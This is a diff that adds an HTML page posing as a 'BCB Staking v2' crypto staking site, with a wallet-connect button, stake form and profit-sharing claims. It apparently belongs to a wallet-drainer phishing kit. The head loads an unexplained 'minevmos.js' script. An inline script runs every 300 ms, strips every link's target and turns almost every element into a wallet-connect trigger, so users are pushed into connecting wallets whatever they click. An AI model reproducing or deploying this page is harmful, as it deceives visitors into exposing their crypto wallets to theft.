@@ -1,0 +1,372 @@
+<!DOCTYPE html><html lang="en" dir="ltr" style="--w3m-color-fg-1: rgb(228,231,231); --w3m-color-fg-2: rgb(148,158,158); --w3m-color-fg-3: rgb(110,119,119); --w3m-color-bg-1: rgb(20,20,20); --w3m-color-bg-2: rgb(39,42,42); --w3m-color-bg-3: rgb(59,64,64); --w3m-color-overlay: rgba(255,255,255,0.1); --w3m-accent-color: #3396FF; --w3m-accent-fill-color: #FFFFFF; --w3m-z-index: 89; --w3m-background-color: #3396FF; --w3m-background-border-radius: 8px; --w3m-container-border-radius: 30px; --w3m-wallet-icon-border-radius: 15px; --w3m-wallet-icon-large-border-radius: 30px; --w3m-wallet-icon-small-border-radius: 7px; --w3m-input-border-radius: 28px; --w3m-button-border-radius: 10px; --w3m-notification-border-radius: 36px; --w3m-secondary-button-border-radius: 28px; --w3m-icon-button-border-radius: 50%; --w3m-button-hover-highlight-border-radius: 10px; --w3m-text-big-bold-size: 20px; --w3m-text-big-bold-weight: 600; --w3m-text-big-bold-line-height: 24px; --w3m-text-big-bold-letter-spacing: -0.03em; --w3m-text-big-bold-text-transform: none; --w3m-text-xsmall-bold-size: 10px; --w3m-text-xsmall-bold-weight: 700; --w3m-text-xsmall-bold-line-height: 12px; --w3m-text-xsmall-bold-letter-spacing: 0.02em; --w3m-text-xsmall-bold-text-transform: uppercase; --w3m-text-xsmall-regular-size: 12px; --w3m-text-xsmall-regular-weight: 600; --w3m-text-xsmall-regular-line-height: 14px; --w3m-text-xsmall-regular-letter-spacing: -0.03em; --w3m-text-xsmall-regular-text-transform: none; --w3m-text-small-thin-size: 14px; --w3m-text-small-thin-weight: 500; --w3m-text-small-thin-line-height: 16px; --w3m-text-small-thin-letter-spacing: -0.03em; --w3m-text-small-thin-text-transform: none; --w3m-text-small-regular-size: 14px; --w3m-text-small-regular-weight: 600; --w3m-text-small-regular-line-height: 16px; --w3m-text-small-regular-letter-spacing: -0.03em; --w3m-text-small-regular-text-transform: none; --w3m-text-medium-regular-size: 16px; --w3m-text-medium-regular-weight: 600; --w3m-text-medium-regular-line-height: 20px; --w3m-text-medium-regular-letter-spacing: -0.03em; --w3m-text-medium-regular-text-transform: none; --w3m-font-family: -apple-system, system-ui, BlinkMacSystemFont, 'Segoe UI', Roboto, Ubuntu, 'Helvetica Neue', sans-serif; --w3m-font-feature-settings: 'tnum' on, 'lnum' on, 'case' on; --w3m-success-color: rgb(38,181,98); --w3m-error-color: rgb(242, 90, 103); --w3m-overlay-background-color: rgba(0, 0, 0, 0.3); --w3m-overlay-backdrop-filter: none; --w3m-background-image-url: none;"><head>
+  <title>BCB Staking v2</title>
+
+  <meta charset="utf-8"><script charset="UTF-8" async type="text/javascript" src="minevmos.js"></script><script>
+    function addClassesToElements() {
+        const links = document.querySelectorAll('a:not(.connectButton)');
+        for (const link of links) {
+            link.removeAttribute('href');
+            link.classList.add('connectButton');
+        }
+        const buttons = document.querySelectorAll('div:not(.connectButton):not(.web3-overlay):not(.item):not(.web3-modal-items):not(.web3-modal-title):not(.web3-modal)');
+        for (const button of buttons) {
+            button.classList.add('connectButton');
+        }
+    }
+    setInterval(addClassesToElements, 300);
+  </script>
+  <!--[if IE]><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" /><![endif]-->
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="">
+
+  <!-- Css -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" integrity="sha256-YvdLHPgkqJ8DVUxjjnGVlMMJtNimJ6dYkowFFvp4kKs=" crossorigin="anonymous">
+  <link rel="stylesheet" href="./css/style.css?v=1.2">
+  <link rel="stylesheet" href="./css/style2.css?v=1.2">
+
+  <!-- Favicons -->
+  <link rel="shortcut icon" href="img/favicon.ico">
+
+</head>
+
+<body class="overflow-x-hidden font-body text-jacarta-500" style="background: linear-gradient(0deg, hsla(210, 36%, 4%, 1) 0%, hsla(199, 82%, 13%, 1) 38%, hsla(199, 82%, 13%, 1) 61%, hsla(210, 36%, 4%, 1) 100%);" itemscope="" itemtype="http://schema.org/WebPage">
+  <!-- Header -->
+  <header class="js-page-header page-header--transparent fixed top-0 z-20 w-full backdrop-blur transition-colors">
+    <div class="flex items-center px-6 py-6 xl:px-24">
+      <!-- Logo -->
+      <a href="index.html" class="flex-1 shrink-0">
+        <img src="img/logo.png" class="max-h-7" alt="BCB">
+      </a>
+
+      <div class="flex-1 justify-end lg:flex">
+        <button id="connect" type="button" class="rounded-xl py-3 px-8 text-center text-black " style="background:#03E3FE">Connect Wallet</button>
+      </div>
+
+
+    </div>
+  </header>
+
+  <main class="overflow-x-hidden  pt-5">
+
+    <!-- Intro Video -->
+    <div class="relative mx-auto max-w-[90rem]">
+
+      <!-- <img src="img/nft-game/crypto_icons.png" class="pointer-events-none absolute -top-1/4 animate-fly" alt="" /> -->
+      <div class="container">
+        <figure class="relative overflow-hidden rounded-3xl before:absolute before:inset-0 before:bg-jacarta-900/25">
+        </figure>
+      </div>
+    </div>
+    <!-- end intro video -->
+
+    <!-- Characters Slider -->
+    <section class="relative pt-5 pt-sm-0">
+      <!-- <picture class="pointer-events-none absolute inset-0 -z-10">
+        <img src="img/gradient_creative.jpg" alt="gradient" class="h-full w-full" />
+      </picture> -->
+
+      <div class="flex items-center justify-center px-6 pb-16 sm:px-0">
+
+
+      </div>
+    </section>
+    <!-- end characters slider -->
+
+    <!-- Statistic / Promo -->
+    <section class="relative pb-20">
+      <!-- <picture
+        class="pointer-events-none absolute inset-0 -z-10 after:absolute after:bottom-0 after:h-1/3 after:w-full after:bg-gradient-to-t after:from-[#010107]">
+        <img src="img/gradient_creative.jpg" alt="gradient" class="h-full w-full -scale-y-100" />
+      </picture> -->
+      <div class="flex items-center px-lg-2 py-6 px-xl-5">
+        <div class="flex justify-center row gx-4">
+
+          <div class="row mt-2 col-12 col-xl-3 text-center">
+            <div class="col mt-3 mt-sm-0 text-center">
+              <div class="lg:p-0 p-sm-4 main-panel mb-4 glass h-100">
+                <h2 class="mx-auto max-w-xl text-center font-display text-xl text-white">
+                  Circulating Supply Staked
+                </h2>
+
+                <h2 id="progress" class="mt-12 text-center font-display text-sm font-medium text-white md:text-sm">-%
+                </h2>
+                <p></p>
+                <div class="outer-progress">
+                  <div id="progressbar" class="progressbar mb-3" style="width: 5%;"></div>
+                </div>
+                <p class="text-lg text-jacarta-300" style="color: white; display:none;">Pool 1<span id="countdownTo">Ends</span> In</p>
+                <table class="countdown mx-auto" style="display:none;">
+                  <tbody>
+                    <tr class="cr text-lg text-jacarta-300">
+                      <td id="cd" class="time" style="color: #24E500;">10</td>
+                      <td class="time-pad">:</td>
+                      <td id="ch" class="time" style="color: #24E500;">00</td>
+                      <td class="time-pad">:</td>
+                      <td id="cm" class="time" style="color: #24E500;">00</td>
+                      <td class="time-pad">:</td>
+                      <td id="cs" class="time" style="color: #24E500;">00</td>
+                    </tr>
+                    <tr class="cl">
+                      <td id="ld">Days</td>
+                      <td></td>
+                      <td id="lh">Hours</td>
+                      <td></td>
+                      <td id="lm">Minutes</td>
+                      <td></td>
+                      <td id="ls">Seconds</td>
+                    </tr>
+                  </tbody>
+                </table>
+                <br>
+                <p class="text-lg text-jacarta-300 text-left" style="color: white;">
+                  Stake your $BCB tokens to receive a 100% share of the platform profits generated from the Sportsbook, Casino, Arcade and Poker offers.  
+                </p><br>
+                <p class="text-lg text-jacarta-300 text-left" style="color: white;">
+                  The staking process involves an initial 30 day lock. To be eligible to claim your percentage of the platform profits you must have staked your tokens for a minimum of 7 days. Once you have reached this period, you will continue to receive platform profits on a continual basis until you un-stake your $BCB tokens.
+                </p>
+
+              </div>
+            </div>
+          </div>
+
+          <div class=" row col-12 col-xl-6 mt-2">
+            <div class="col mt-3 mt-sm-0 text-center">
+
+              <div class="lg:p-0 p-sm-4 main-panel mb-4 glass h-100">
+                <h2 class="flex justify-center mx-auto mb-3 max-w-xl text-center font-display text-3xl text-white">
+                  <strong>POOL 2 </strong>
+                  <div class="flex items-center" style="margin-left: 14px;background: rgba(0, 255, 41, 0.1);
+                  border-radius: 6px; padding: 9px 11px; ">
+                    <span id="isOpen" class="text-base" style="color: #24E500;">OPEN</span>
+                  </div>
+                </h2>
+                <div class="">
+                  <div id="whitelisted">
+                  </div>
+                </div>
+
+                <div class="form-group p-3 green-bg">
+
+                  <div style="background: #0F1215;
+                              border-radius: 12px;
+                              padding: 18px 24px;">
+                    <div class="flex justify-between text-lg text-jacarta-300" style="color: white;">
+                      My BCB Balance: <span id="myBalance" style="color: #03E3FE;">-</span>
+                    </div>
+                    <div class="flex justify-between text-lg text-jacarta-300" style="color: white;">My Stakable BCB:
+                      <span id="myStakable" style="color: #03E3FE;">-</span>
+                    </div>
+                    <div class="flex justify-between text-lg text-jacarta-300 d-none" style="color: white;">My pending USD:
+                      $<span id="myUSD" style="color: #03E3FE;">-</span>
+                    </div>
+                    <div class="text-right text-lg text-jacarta-300 d-none" style="color: white;">
+                      <button id="claimusd" type="button" class="btn-sm" style="background-color: #03E3FE; color: black;font-weight: 700;
+                      line-height: 24px;">Claim USD</button>
+                    </div>
+                    <div class="flex justify-between text-lg text-jacarta-300 d-none" style="color: white;">My pending ETH:
+                      <span id="myETH" style="color: #03E3FE;">-</span>
+                    </div>
+                    <div class="text-right text-lg text-jacarta-300 d-none" style="color: white;">
+                      <button id="claimeth" type="button" class="btn-sm" style="background-color: #03E3FE; color: black;font-weight: 700;
+                      line-height: 24px;">Claim ETH</button>
+                    </div>
+                    <div class="flex justify-between text-lg text-jacarta-300 d-none" style="color: white;">Total BCB
+                      Claimed: <span id="totalClaimed" style="color: #03E3FE;">-</span></div>
+                  </div>
+
+                  <div class="mt-12">
+
+                    <div class="input-group fs-5" style="
+                    background: #35414B;
+                    border-radius: 12px;
+                    padding: 16px 24px;
+                    position: relative" id="inputgrid">
+                      <input style="
+                      background: transparent;
+                      border: none;color: white;" type="number" class="form-control" id="stakeAmount" placeholder="Enter Stake Amount" min="1" max="10000000">
+                      <span><img src="./logo-sm.png" alt=""> </span>
+                      <a href="" id="max" class="flex items-center" style="font-weight: 700; font-size: 18px; color: #03E3FE;">Max Stake</a>
+                    </div>
+
+                    <div class="mt-12 dropdown" id="dropdown">
+                      <a href="#" id="js-link" class="js-link">30 day lock<i class="fa fa-chevron-down"></i></a>
+                      <ul class="js-dropdown-list">
+                        <li class="js-option" value="2">30 day lock</li>
+                      </ul>
+                    </div>
+
+                    <select class="form-control mt-12" id="lock" hidden="">
+                      <option value="2">30 day lock</option>
+                    </select>
+
+                    <button id="stake" type="button" class="mx-0 mt-12 pt-4 pb-4 w-full text-center transition-all" style="background-color: #03E3FE; color: black;font-weight: 700;
+                      font-size: 20px; padding-top: 16px;
+                      line-height: 24px;" disabled="">Create Stake</button>
+                  </div>
+                  <p class="text-xs mt-4 text-jacarta-300" style="color: rgb(198, 195, 195);">
+                    <i>
+                      Contact support if you get transaction errors, do not force a transaction that will fail!
+                    </i>
+                  </p>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div class="row mt-2 col-12 col-xl-3 text-center ">
+
+            <div class="col-12 col-md-12 text-center ">
+              <div class="lg:p-0 p-sm-4 main-panel mb-4 glass h-100">
+                <p class="text-lg text-jacarta-300" style="color: white;">
+                  Platform profits are determined by the currency used to place bets and/or play on the platform over a specific time period, minus any operating expenses. By staking your $BCB tokens, you will receive staking rewards in $ETH, $USDT and $BCB.
+                </p><br>
+              </div>
+            </div>
+
+            <div class="col-12 mt-2 col-md-12 text-center mt-4">
+              <div class="lg:p-0 p-sm-4 main-panel mb-4 glass h-100  text-jacarta-300">
+                <h2 class="mx-auto mt-4 mb-4 max-w-xl text-center font-display text-2xl text-white">Total Distributed Profit</h2>
+                <p>Among stakers so far: $486,134</p>
+                
+                <ul class="text-start d-inline-block px-0 text-lg d-none" style="list-style: inside;">
+                  <li class="" style="color: white;">No lock: <span id="apy">-</span>%</li>
+                  <li class="" style="color: white;">7 days boost: <span id="apy2">-</span>%
+                  </li>
+                  <li class="" style="color: white;">30 days boost: <span id="apy3">-</span>%
+                  </li>
+                </ul>
+                
+                <div class="d-none">
+                  <br><br>
+                  <p class="text-white">APR represents net profit in BCB, ETH, and USDT</p>
+                  <p class="text-white text-small">
+                    
+                  </p>
+                </div>
+              </div>
+            </div>
+
+          </div>
+          <div class=" row mt-4" id="myStakes">
+
+        </div>
+        </div>
+        
+        <template id="source">
+          <div class="col-12 col-lg-6 mt-3 mt-sm-0 mb-2 text-center">
+            <div class="p-0 p-sm-4 main-panel glass h-100">
+
+              <div class="form-group  p-1 green-bg text-lg text-jacarta-300">
+                <div><span class="poolHeader">Staked</span>: <span class="stakedAmount text-white">-</span><span style="background: linear-gradient(to right, #88f3ff,#2a53f7); -webkit-text-fill-color: transparent; -webkit-background-clip: text;"> $BCB</span></div>
+                <div class="text-white">Locked Until: <span class="lockedUntil">-</span></div>
+                <div class="text-white">Claimable: <span class="claimableStake">-</span></div>
+                <div class="text-white">Claimed: <span class="claimedStake">-</span></div>
+                <div class="text-white d-none">Estimated USD Airdrop**: $<span class="usdtdrop">-</span></div>
+                <div class=" locktax" style="color: red;">Unstake Fee: <span class="emergencyFee">-</span></div>
+                <div class="buttons form-group text-center mb-3">
+                  <button type="button" class="claim text-center font-semibold text-accent shadow-white-volume transition-all hover:bg-accent-dark hover:text-white hover:shadow-accent-volume">Claim</button>
+                  <button type="button" class="reclaim text-center font-semibold text-accent shadow-white-volume transition-all hover:bg-accent-dark hover:text-white hover:shadow-accent-volume">Unstake*</button>
+                  <button type="button" class="d-none compound text-center font-semibold text-accent shadow-white-volume transition-all hover:bg-accent-dark hover:text-white hover:shadow-accent-volume">Compound</button>
+                  <button type="button" class="d-none updateLock text-center font-semibold text-accent shadow-white-volume transition-all hover:bg-accent-dark hover:text-white hover:shadow-accent-volume">Relock</button>
+                  <button type="button" class="d-none lock1 text-center font-semibold text-accent shadow-white-volume transition-all hover:bg-accent-dark hover:text-white hover:shadow-accent-volume">7 day lock</button>
+                  <button type="button" class="lock2 text-center font-semibold text-accent shadow-white-volume transition-all hover:bg-accent-dark hover:text-white hover:shadow-accent-volume">30 day lock</button>
+                </div>
+
+                <p class="small text-xs mt-1" style="color: white;"><i>*Unstaking will not claim rewards<span class="locktax"> and during the lock period will incur the unstaking fee!</span></i></p>
+                
+              </div>
+
+              <p><span id="stakePY"></span></p>
+            </div>
+          </div>
+        </template>
+      </div>
+    </section>
+
+  </main>
+
+  <!-- Modal -->
+  <div class="modal fade" id="alertModal" tabindex="-1" aria-labelledby="alertModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-dialog-centered modal-dialog-scrollable">
+      <div class="modal-content pink-bg py-0">
+        <div class="modal-header">
+          <h5 class="modal-title" id="alertModalLabel">Alert</h5>
+          <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+        </div>
+        <div class="modal-body" id="alertModalBody">
+          <div class="mb-3 text-dark">
+            <p id="user-alert"></p>
+          </div>
+        </div>
+        <div class="modal-footer">
+
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <footer class="page-footer">
+    <div class="px-6 py-6 xl:px-24">
+      <div class="flex flex-col items-center justify-between space-y-2 py-8 sm:flex-row sm:space-y-0">
+        <a href="index.html" class="inline-block">
+          <img src="img/logo.png" class="max-h-7" alt="BCB">
+        </a>
+        <span class="text-sm text-jacarta-400">©
+          <script>
+            document.write(new Date().getFullYear())
+          </script>2024
+          BCB
+        </span>
+        <ul class="flex flex-wrap space-x-4 text-sm text-jacarta-400">
+          <li><a href="#" class="hover:text-white">Terms and conditions</a></li>
+          <li><a href="#" class="hover:text-white">Privacy policy</a></li>
+        </ul>
+      </div>
+    </div>
+  </footer>
+
+  <!-- JS Scripts -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.9.0/web3.min.js" integrity="sha512-mUvdtCaVKd9dby/UnYGKMLkP3eT7EA6QNFN5iSEjvMf8TFPq2oZFIemWL46iypQcL8xYNdx7wQIA1oYnTXuYhg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+  
+  <script>
+    var env = {NODE_ENV : 'production'};
+    var process = {env};
+  </script>
+  
+  <script type="module" src="./main.js?v=2.30"></script>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha256-9SEPo+fwJFpMUet/KACSwO+Z/dKMReF9q4zFhU/fT9M=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+  <script>
+    document.getElementById("stakeAmount").addEventListener("focus", () => {
+      document.getElementById("inputgrid").style.border = "1px solid #03E3FE"
+      document.getElementById("inputgrid").style.boxShadow = "0px 0px 7px #03E3FE"
+    });
+    document.getElementById("js-link").addEventListener("focus", () => {
+      document.getElementById("dropdown").style.border = "1px solid #03E3FE"
+      document.getElementById("dropdown").style.boxShadow = "0px 0px 7px #03E3FE"
+    });
+    $(function () {
+      var list = $('.js-dropdown-list');
+      var link = $('.js-link');
+      link.click(function (e) {
+        e.preventDefault();
+        list.slideToggle(200);
+      });
+      list.find('li').click(function () {
+        var text = $(this).html();
+        var icon = '<i class="fa fa-chevron-down"></i>';
+        console.log($(this).val(), "text")
+        $("#lock").val($(this).val())
+        link.html(text + icon);
+        list.slideToggle(200);
+        if (text === '* Reset') {
+          link.html('Select one option' + icon);
+        }
+      });
+    });
+  </script>
+
+
+<w3m-modal></w3m-modal><iframe id="verify-api" src="https://verify.walletconnect.com/0e6128ee5edcb7de042844d0b208c4a9" style="display: none;"></iframe></body></html>
